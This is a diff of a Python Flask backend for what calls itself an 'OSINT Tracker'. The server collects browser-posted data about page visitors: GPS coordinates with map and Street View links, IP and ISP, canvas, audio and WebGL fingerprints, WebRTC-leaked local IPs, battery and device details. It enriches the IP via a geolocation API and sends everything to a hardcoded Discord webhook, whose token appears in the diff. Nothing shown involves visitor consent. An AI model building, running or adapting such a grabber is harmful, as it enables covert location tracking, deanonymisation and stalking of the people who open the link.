@@ -4,138 +4,60 @@ import datetime
 import os
 import requests
 import re
+import time
 from pathlib import Path
 import ipaddress
 
 app = Flask(__name__)
 
-# Your Discord webhook URL
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536152829444493322/2l-TyMVUKD8Ly2wk-0amSwuTwUeXY_yOltEQT1MMH8OT-d8vzN8UsbAQ7aJK2iSzgy7o"
-
-# IP Intelligence APIs (free tier)
-IP_APIS = {
-    "ipinfo": "https://ipinfo.io/json",
-    "ipapi": "https://ipapi.co/json/",
-    "ip-api": "http://ip-api.com/json/",
-    "geoplugin": "http://www.geoplugin.net/json.gp",
-}
-
-def get_ip_intelligence(ip=None):
-    """Fetch comprehensive IP intelligence from multiple sources"""
-    intelligence = {}
-    
-    # Try multiple APIs for redundancy
-    for name, url in IP_APIS.items():
-        try:
-            response = requests.get(url, timeout=5)
-            if response.status_code == 200:
-                data = response.json()
-                intelligence[name] = data
-        except:
-            continue
-    
-    # Parse and consolidate intelligence
-    consolidated = {}
-    
-    # Extract IP
-    for source in intelligence.values():
-        if 'ip' in source:
-            consolidated['ip'] = source['ip']
-            break
-    
-    # Extract ISP/Organization
-    for source in intelligence.values():
-        if 'org' in source:
-            consolidated['isp'] = source['org']
-            break
-        elif 'isp' in source:
-            consolidated['isp'] = source['isp']
-            break
-    
-    # Extract ASN
-    for source in intelligence.values():
-        if 'asn' in source:
-            consolidated['asn'] = source['asn']
-            break
-        elif 'as' in source:
-            consolidated['asn'] = source['as']
-            break
-    
-    # Extract Location
-    for source in intelligence.values():
-        if 'city' in source:
-            consolidated['city'] = source['city']
-        if 'region' in source:
-            consolidated['region'] = source['region']
-        if 'country' in source:
-            consolidated['country'] = source['country']
-        if 'country_code' in source:
-            consolidated['country_code'] = source['country_code']
-        if 'zip' in source:
-            consolidated['zip'] = source['zip']
-        if 'timezone' in source:
-            consolidated['timezone'] = source['timezone']
-        if 'loc' in source:
-            loc = source['loc'].split(',')
-            if len(loc) == 2:
-                consolidated['latitude'] = loc[0]
-                consolidated['longitude'] = loc[1]
-    
-    # VPN/Proxy Detection
-    consolidated['vpn'] = False
-    consolidated['proxy'] = False
-    consolidated['hosting'] = False
-    consolidated['mobile'] = False
-    
-    for source in intelligence.values():
-        if 'proxy' in source and source['proxy']:
-            consolidated['proxy'] = True
-        if 'hosting' in source and source['hosting']:
-            consolidated['hosting'] = True
-        if 'vpn' in source and source['vpn']:
-            consolidated['vpn'] = True
-        if 'mobile' in source and source['mobile']:
-            consolidated['mobile'] = True
-        
-        # Check for keywords that indicate hosting/VPN
-        if 'org' in source:
-            org_lower = source['org'].lower()
-            if any(word in org_lower for word in ['hosting', 'cloud', 'vpn', 'proxy', 'datacenter']):
-                consolidated['hosting'] = True
-            if any(word in org_lower for word in ['vpn', 'proxy']):
-                consolidated['vpn'] = True
-    
-    # Security Intelligence (if available)
-    consolidated['threat'] = {}
-    if 'ipinfo' in intelligence and 'privacy' in intelligence['ipinfo']:
-        privacy = intelligence['ipinfo']['privacy']
-        consolidated['threat']['vpn'] = privacy.get('vpn', False)
-        consolidated['threat']['proxy'] = privacy.get('proxy', False)
-        consolidated['threat']['hosting'] = privacy.get('hosting', False)
-        consolidated['threat']['tor'] = privacy.get('tor', False)
-    
-    return consolidated
+# --- YOUR NEW DISCORD WEBHOOK URL ---
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536189236431290369/lAIwbt_ESg5gor_CXxkx7WbR8Sjol7lMtg_EeWVYBJaiK8c_8znAEXMPGUxQxrwF5deB"
 
 def send_to_discord(data):
-    """Send comprehensive data to Discord webhook"""
+    """Send collected data to Discord webhook with retry logic"""
     
+    print(f"\n{'='*60}")
+    print(f"SENDING TO DISCORD: {datetime.datetime.now()}")
+    print(f"{'='*60}")
+    
+    # Simple test message first
+    test_payload = {
+        "content": "🔔 **Webhook Test** - Your tracker is active!",
+        "username": "OSINT Tracker"
+    }
+    
+    try:
+        # First, send a test message to verify the webhook works
+        test_response = requests.post(DISCORD_WEBHOOK, json=test_payload, timeout=10)
+        print(f"Test message status: {test_response.status_code}")
+        
+        if test_response.status_code != 204:
+            print(f"⚠️ Webhook test failed: {test_response.status_code} - {test_response.text}")
+            # Continue anyway, maybe the webhook still works for embeds
+        else:
+            print("✅ Webhook test message sent!")
+            
+    except Exception as e:
+        print(f"⚠️ Error sending test message: {e}")
+        # Continue with the main payload anyway
+    
+    # --- Build the main embed ---
     embed = {
         "title": "🎯 OSINT Intel Package",
         "color": 0x5865F2,
         "fields": [],
-        "footer": {"text": f"Session: {data.get('sessionId', 'unknown')} | {datetime.datetime.utcnow().isoformat()}"}
+        "footer": {"text": f"Session: {data.get('sessionId', 'unknown')} | {datetime.datetime.utcnow().isoformat()}"},
+        "timestamp": datetime.datetime.utcnow().isoformat()
     }
     
-    # --- LOCATION SECTION ---
+    # 1. LOCATION (Primary focus)
     location = data.get('location', {})
-    ip_intel = data.get('ipIntel', {})
-    
-    # GPS Location
     if location and isinstance(location, dict):
         lat = location.get('latitude')
         lng = location.get('longitude')
+        accuracy = location.get('accuracy', 'N/A')
+        
         if lat and lat != 'N/A' and lng and lng != 'N/A':
-            accuracy = location.get('accuracy', 'N/A')
             maps_link = f"https://maps.google.com/?q={lat},{lng}"
             street_view = f"https://maps.google.com/maps?q={lat},{lng}&z=19&t=k&layer=c"
             
@@ -144,149 +66,77 @@ def send_to_discord(data):
                 "value": f"**Coordinates:** {lat}, {lng}\n**Accuracy:** ±{accuracy}m\n[Google Maps]({maps_link}) | [Street View]({street_view})",
                 "inline": False
             })
-    
-    # IP-based Location
-    ip_loc = []
-    if ip_intel.get('city'):
-        ip_loc.append(f"**City:** {ip_intel.get('city')}")
-    if ip_intel.get('region'):
-        ip_loc.append(f"**Region:** {ip_intel.get('region')}")
-    if ip_intel.get('country'):
-        ip_loc.append(f"**Country:** {ip_intel.get('country')}")
-    if ip_intel.get('zip'):
-        ip_loc.append(f"**ZIP:** {ip_intel.get('zip')}")
-    if ip_intel.get('timezone'):
-        ip_loc.append(f"**Timezone:** {ip_intel.get('timezone')}")
-    
-    if ip_loc:
-        embed["fields"].append({
-            "name": "🌐 IP Location",
-            "value": "\n".join(ip_loc),
-            "inline": False
-        })
-    
-    # --- IP INTELLIGENCE ---
-    ip_intel_fields = []
-    if ip_intel.get('ip'):
-        ip_intel_fields.append(f"**IP:** `{ip_intel.get('ip')}`")
-    if ip_intel.get('isp'):
-        ip_intel_fields.append(f"**ISP:** {ip_intel.get('isp')}")
-    if ip_intel.get('asn'):
-        ip_intel_fields.append(f"**ASN:** {ip_intel.get('asn')}")
-    
-    # Threat detection
-    threat = []
-    if ip_intel.get('vpn'): threat.append("🚫 VPN")
-    if ip_intel.get('proxy'): threat.append("🚫 Proxy")
-    if ip_intel.get('hosting'): threat.append("☁️ Hosting/Cloud")
-    if ip_intel.get('mobile'): threat.append("📱 Mobile Network")
-    
-    if threat:
-        ip_intel_fields.append(f"**Threat Flags:** {' '.join(threat)}")
-    
-    if ip_intel_fields:
-        embed["fields"].append({
-            "name": "🕵️ IP Intelligence",
-            "value": "\n".join(ip_intel_fields),
-            "inline": False
-        })
-    
-    # --- WEBRTC LEAK ---
-    webrtc = data.get('webRTCIPs', [])
-    if webrtc and webrtc[0] != 'No local IPs found':
-        embed["fields"].append({
-            "name": "🔓 WebRTC IP Leak",
-            "value": f"```{', '.join(webrtc)}```",
-            "inline": False
-        })
-    
-    # --- DEVICE FINGERPRINT ---
-    device_fields = []
-    
-    # OS/Platform
-    user_agent = data.get('userAgent', '')
-    if user_agent:
-        # Parse OS from user agent
-        os_parsed = "Unknown"
-        if 'Windows' in user_agent:
-            os_parsed = "Windows"
-            if 'NT 10.0' in user_agent: os_parsed += " 10/11"
-            elif 'NT 6.1' in user_agent: os_parsed += " 7"
-            elif 'NT 6.2' in user_agent: os_parsed += " 8"
-            elif 'NT 6.3' in user_agent: os_parsed += " 8.1"
-        elif 'Mac OS X' in user_agent:
-            os_parsed = "macOS"
-        elif 'Linux' in user_agent and 'Android' not in user_agent:
-            os_parsed = "Linux"
-        elif 'Android' in user_agent:
-            os_parsed = "Android"
-        elif 'iPhone' in user_agent or 'iPad' in user_agent:
-            os_parsed = "iOS"
-        
-        # Parse browser
-        browser_parsed = "Unknown"
-        if 'Chrome' in user_agent and 'Edg' not in user_agent:
-            browser_parsed = "Chrome"
-        elif 'Firefox' in user_agent:
-            browser_parsed = "Firefox"
-        elif 'Safari' in user_agent and 'Chrome' not in user_agent:
-            browser_parsed = "Safari"
-        elif 'Edg' in user_agent:
-            browser_parsed = "Edge"
-        elif 'OPR' in user_agent or 'Opera' in user_agent:
-            browser_parsed = "Opera"
-        
-        device_fields.append(f"**OS:** {os_parsed}")
-        device_fields.append(f"**Browser:** {browser_parsed}")
-    
-    # Hardware
-    if data.get('hardwareConcurrency'):
-        device_fields.append(f"**CPU Cores:** {data['hardwareConcurrency']}")
-    if data.get('deviceMemory'):
-        device_fields.append(f"**RAM:** {data['deviceMemory']}GB")
-    if data.get('touchPoints'):
-        device_fields.append(f"**Touch Points:** {data['touchPoints']}")
-    if data.get('platform'):
-        device_fields.append(f"**Platform:** {data['platform']}")
-    
-    # Screen
-    screen = data.get('screen', {})
-    if screen:
-        screen_info = f"{screen.get('width', 'N/A')}x{screen.get('height', 'N/A')}"
-        if screen.get('pixelRatio'):
-            screen_info += f" @{screen.get('pixelRatio')}x"
-        device_fields.append(f"**Screen:** {screen_info}")
-    
-    if device_fields:
-        embed["fields"].append({
-            "name": "💻 Device Info",
-            "value": "\n".join(device_fields),
-            "inline": False
-        })
-    
-    # --- GPU & GRAPHICS ---
-    webgl = data.get('webgl', {})
-    if webgl:
-        gpu_fields = []
-        if webgl.get('vendor'):
-            gpu_fields.append(f"**GPU:** {webgl.get('vendor')}")
-        if webgl.get('renderer'):
-            gpu_fields.append(f"**Renderer:** {webgl.get('renderer')}")
-        if gpu_fields:
+        else:
+            error_msg = location.get('error', 'Location not shared')
             embed["fields"].append({
-                "name": "🎮 Graphics",
-                "value": "\n".join(gpu_fields),
+                "name": "📍 Location",
+                "value": f"❌ Location not shared\nReason: {error_msg}",
                 "inline": False
             })
     
-    # --- FINGERPRINTS ---
+    # 2. IP Intelligence
+    ip_intel = data.get('ipIntel', {})
+    if ip_intel:
+        ip_fields = []
+        if ip_intel.get('ip'): ip_fields.append(f"**IP:** `{ip_intel.get('ip')}`")
+        if ip_intel.get('isp'): ip_fields.append(f"**ISP:** {ip_intel.get('isp')}")
+        if ip_intel.get('asn'): ip_fields.append(f"**ASN:** {ip_intel.get('asn')}")
+        if ip_intel.get('city'): ip_fields.append(f"**City:** {ip_intel.get('city')}")
+        if ip_intel.get('region'): ip_fields.append(f"**Region:** {ip_intel.get('region')}")
+        if ip_intel.get('country'): ip_fields.append(f"**Country:** {ip_intel.get('country')}")
+        
+        # Threat detection
+        threats = []
+        if ip_intel.get('vpn'): threats.append("🔒 VPN")
+        if ip_intel.get('proxy'): threats.append("🚫 Proxy")
+        if ip_intel.get('hosting'): threats.append("☁️ Hosting")
+        if ip_intel.get('mobile'): threats.append("📱 Mobile")
+        if threats:
+            ip_fields.append(f"**Threats:** {', '.join(threats)}")
+        
+        if ip_fields:
+            embed["fields"].append({
+                "name": "🌐 IP Intelligence",
+                "value": "\n".join(ip_fields),
+                "inline": False
+            })
+    
+    # 3. Device Hardware
+    hardware = data.get('hardware', {})
+    if hardware:
+        device_fields = []
+        if hardware.get('platform'): device_fields.append(f"**Platform:** {hardware.get('platform')}")
+        if hardware.get('hardwareConcurrency'): device_fields.append(f"**CPU Cores:** {hardware.get('hardwareConcurrency')}")
+        if hardware.get('deviceMemory'): device_fields.append(f"**RAM:** {hardware.get('deviceMemory')}GB")
+        if hardware.get('maxTouchPoints'): device_fields.append(f"**Touch Points:** {hardware.get('maxTouchPoints')}")
+        
+        # Screen
+        screen = data.get('screen', {})
+        if screen:
+            screen_res = f"{screen.get('width', 'N/A')}x{screen.get('height', 'N/A')}"
+            if screen.get('pixelRatio'):
+                screen_res += f" @{screen.get('pixelRatio')}x"
+            device_fields.append(f"**Screen:** {screen_res}")
+        
+        if device_fields:
+            embed["fields"].append({
+                "name": "💻 Device",
+                "value": "\n".join(device_fields),
+                "inline": False
+            })
+    
+    # 4. Fingerprints
     fingerprint_fields = []
     if data.get('canvasFingerprint'):
-        fingerprint_fields.append(f"**Canvas:** `{data['canvasFingerprint']}`")
+        fingerprint_fields.append(f"**Canvas:** `{data.get('canvasFingerprint')}`")
     if data.get('audioFingerprint'):
-        fingerprint_fields.append(f"**Audio:** `{data['audioFingerprint']}`")
-    if data.get('webglFingerprint'):
-        fingerprint_fields.append(f"**WebGL:** `{data['webglFingerprint']}`")
+        fingerprint_fields.append(f"**Audio:** `{data.get('audioFingerprint')}`")
+    if data.get('webgl'):
+        webgl = data.get('webgl', {})
+        if webgl.get('vendor'):
+            fingerprint_fields.append(f"**GPU:** {webgl.get('vendor')}")
+        if webgl.get('renderer'):
+            fingerprint_fields.append(f"**Renderer:** {webgl.get('renderer')}")
     
     if fingerprint_fields:
         embed["fields"].append({
@@ -295,37 +145,12 @@ def send_to_discord(data):
             "inline": False
         })
     
-    # --- FONTS ---
-    fonts = data.get('fonts', [])
-    if fonts:
-        embed["fields"].append({
-            "name": "📝 Installed Fonts",
-            "value": f"```{', '.join(fonts[:15])}```" + (f"\n*+{len(fonts)-15} more*" if len(fonts) > 15 else ""),
-            "inline": False
-        })
-    
-    # --- PLUGINS ---
-    plugins = data.get('plugins', [])
-    if plugins:
-        embed["fields"].append({
-            "name": "🧩 Browser Plugins",
-            "value": f"```{', '.join(plugins[:10])}```" + (f"\n*+{len(plugins)-10} more*" if len(plugins) > 10 else ""),
-            "inline": False
-        })
-    
-    # --- BATTERY ---
+    # 5. Battery
     battery = data.get('battery', {})
     if battery:
         battery_fields = []
-        if battery.get('level'):
-            battery_fields.append(f"**Level:** {battery['level']}")
-        if battery.get('charging') is not None:
-            battery_fields.append(f"**Charging:** {battery['charging']}")
-        if battery.get('chargingTime'):
-            battery_fields.append(f"**Charging Time:** {battery['chargingTime']}s")
-        if battery.get('dischargingTime'):
-            battery_fields.append(f"**Discharging Time:** {battery['dischargingTime']}s")
-        
+        if battery.get('level'): battery_fields.append(f"**Level:** {battery['level']}")
+        if battery.get('charging') is not None: battery_fields.append(f"**Charging:** {battery['charging']}")
         if battery_fields:
             embed["fields"].append({
                 "name": "🔋 Battery",
@@ -333,79 +158,22 @@ def send_to_discord(data):
                 "inline": False
             })
     
-    # --- SENSORS ---
-    sensors = data.get('sensors', {})
-    if sensors:
-        sensor_fields = []
-        if sensors.get('motion'):
-            motion = sensors['motion']
-            sensor_fields.append(f"**Motion:** α={motion.get('alpha', 'N/A'):.2f}° β={motion.get('beta', 'N/A'):.2f}° γ={motion.get('gamma', 'N/A'):.2f}°")
-        if sensors.get('orientation'):
-            orient = sensors['orientation']
-            sensor_fields.append(f"**Orientation:** {orient.get('absolute', 'N/A')}")
-        if sensor_fields:
-            embed["fields"].append({
-                "name": "📱 Sensors",
-                "value": "\n".join(sensor_fields),
-                "inline": False
-            })
+    # 6. WebRTC Leak
+    webrtc = data.get('webRTCIPs', [])
+    if webrtc and webrtc[0] != 'No local IPs found' and webrtc[0] != 'WebRTC not supported':
+        embed["fields"].append({
+            "name": "🔓 WebRTC IP Leak",
+            "value": f"```{', '.join(webrtc)}```",
+            "inline": False
+        })
     
-    # --- NETWORK ---
-    network = data.get('network', {})
-    if network:
-        net_fields = []
-        if network.get('type'):
-            net_fields.append(f"**Type:** {network['type']}")
-        if network.get('downlink'):
-            net_fields.append(f"**Downlink:** {network['downlink']} Mbps")
-        if network.get('rtt'):
-            net_fields.append(f"**RTT:** {network['rtt']}ms")
-        if network.get('saveData'):
-            net_fields.append(f"**Save Data:** {network['saveData']}")
-        
-        if net_fields:
-            embed["fields"].append({
-                "name": "📶 Network",
-                "value": "\n".join(net_fields),
-                "inline": False
-            })
-    
-    # --- PERFORMANCE ---
-    perf = data.get('performance', {})
-    if perf:
-        perf_fields = []
-        if perf.get('loadTime'):
-            perf_fields.append(f"**Load Time:** {perf['loadTime']}ms")
-        if perf.get('domReady'):
-            perf_fields.append(f"**DOM Ready:** {perf['domReady']}ms")
-        if perf.get('dns'):
-            perf_fields.append(f"**DNS:** {perf['dns']}ms")
-        if perf.get('tcp'):
-            perf_fields.append(f"**TCP:** {perf['tcp']}ms")
-        if perf.get('ttfb'):
-            perf_fields.append(f"**TTFB:** {perf['ttfb']}ms")
-        
-        if perf_fields:
-            embed["fields"].append({
-                "name": "⚡ Performance",
-                "value": "\n".join(perf_fields),
-                "inline": False
-            })
-    
-    # --- BEHAVIORAL ---
+    # 7. Behavioral
     behavioral = []
-    if data.get('referrer'):
-        behavioral.append(f"**Referrer:** {data['referrer']}")
-    if data.get('url'):
-        behavioral.append(f"**URL:** {data['url']}")
-    if data.get('tabVisibility') is not None:
-        behavioral.append(f"**Tab Visibility Events:** {data['tabVisibility']}")
-    if data.get('historyDepth'):
-        behavioral.append(f"**History Depth:** {data['historyDepth']}")
-    if data.get('timezone'):
-        behavioral.append(f"**Timezone:** {data['timezone']}")
-    if data.get('language'):
-        behavioral.append(f"**Language:** {data['language']}")
+    if data.get('referrer'): behavioral.append(f"**Referrer:** {data['referrer']}")
+    if data.get('url'): behavioral.append(f"**URL:** {data['url']}")
+    if data.get('language'): behavioral.append(f"**Language:** {data['language']}")
+    if data.get('timezone'): behavioral.append(f"**Timezone:** {data['timezone']}")
+    if data.get('historyDepth') is not None: behavioral.append(f"**History Depth:** {data['historyDepth']}")
     
     if behavioral:
         embed["fields"].append({
@@ -414,33 +182,61 @@ def send_to_discord(data):
             "inline": False
         })
     
-    # --- SECURITY ---
-    security = []
-    if data.get('doNotTrack') is not None:
-        security.append(f"**Do Not Track:** {data['doNotTrack']}")
-    if data.get('cookieEnabled') is not None:
-        security.append(f"**Cookies Enabled:** {data['cookieEnabled']}")
+    # 8. Network
+    network = data.get('network', {})
+    if network:
+        net_fields = []
+        if network.get('type'): net_fields.append(f"**Type:** {network['type']}")
+        if network.get('downlink'): net_fields.append(f"**Downlink:** {network['downlink']} Mbps")
+        if network.get('rtt'): net_fields.append(f"**RTT:** {network['rtt']}ms")
+        if net_fields:
+            embed["fields"].append({
+                "name": "📶 Network",
+                "value": "\n".join(net_fields),
+                "inline": False
+            })
     
-    if security:
+    # Fallback: If no fields, add a generic one
+    if not embed["fields"]:
         embed["fields"].append({
-            "name": "🔒 Security",
-            "value": "\n".join(security),
+            "name": "📊 Data Received",
+            "value": f"Session: {data.get('sessionId', 'unknown')}\nTimestamp: {data.get('timestamp', 'unknown')}",
             "inline": False
         })
     
-    # Send to Discord
+    # --- Send the payload with retry ---
     payload = {
         "content": "📊 **New OSINT Package Collected!**",
         "embeds": [embed],
         "username": "OSINT Tracker"
     }
     
-    try:
-        response = requests.post(DISCORD_WEBHOOK, json=payload)
-        return response.status_code == 204
-    except Exception as e:
-        print(f"Discord send error: {e}")
-        return False
+    # Try up to 3 times
+    for attempt in range(3):
+        try:
+            print(f"📤 Sending Discord payload (attempt {attempt+1}/3)...")
+            response = requests.post(DISCORD_WEBHOOK, json=payload, timeout=15)
+            print(f"📥 Discord response: {response.status_code}")
+            
+            if response.status_code == 204:
+                print("✅ Data sent successfully to Discord!")
+                return True
+            elif response.status_code == 429:
+                # Rate limited - wait and retry
+                retry_after = int(response.headers.get('Retry-After', 5))
+                print(f"⏳ Rate limited, waiting {retry_after} seconds...")
+                time.sleep(retry_after)
+            else:
+                print(f"❌ Discord error: {response.status_code} - {response.text}")
+                # Wait before retry
+                time.sleep(2)
+                
+        except Exception as e:
+            print(f"❌ Discord send error: {e}")
+            time.sleep(2)
+    
+    print("❌ All attempts to send to Discord failed")
+    return False
 
 # Serve the main page
 @app.route('/')
@@ -452,9 +248,31 @@ def serve_index():
 def track_data():
     data = request.json
     
-    # Get IP intelligence
+    # Get IP intelligence from request headers
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-    ip_intel = get_ip_intelligence(client_ip)
+    
+    # Try to get IP info (you can add your own API key here)
+    ip_intel = {}
+    try:
+        response = requests.get(f'http://ip-api.com/json/{client_ip}', timeout=5)
+        if response.status_code == 200:
+            ip_data = response.json()
+            if ip_data.get('status') == 'success':
+                ip_intel = {
+                    'ip': ip_data.get('query'),
+                    'country': ip_data.get('country'),
+                    'city': ip_data.get('city'),
+                    'region': ip_data.get('regionName'),
+                    'isp': ip_data.get('isp'),
+                    'asn': ip_data.get('as'),
+                    'org': ip_data.get('org'),
+                    'timezone': ip_data.get('timezone'),
+                    'lat': ip_data.get('lat'),
+                    'lon': ip_data.get('lon')
+                }
+    except Exception as e:
+        print(f"IP lookup failed: {e}")
+    
     data['ipIntel'] = ip_intel
     
     # Log to console
@@ -466,7 +284,6 @@ def track_data():
     
     # Send to Discord
     discord_sent = send_to_discord(data)
-    print(f"Discord webhook sent: {discord_sent}")
     
     return jsonify({
         "status": "success",
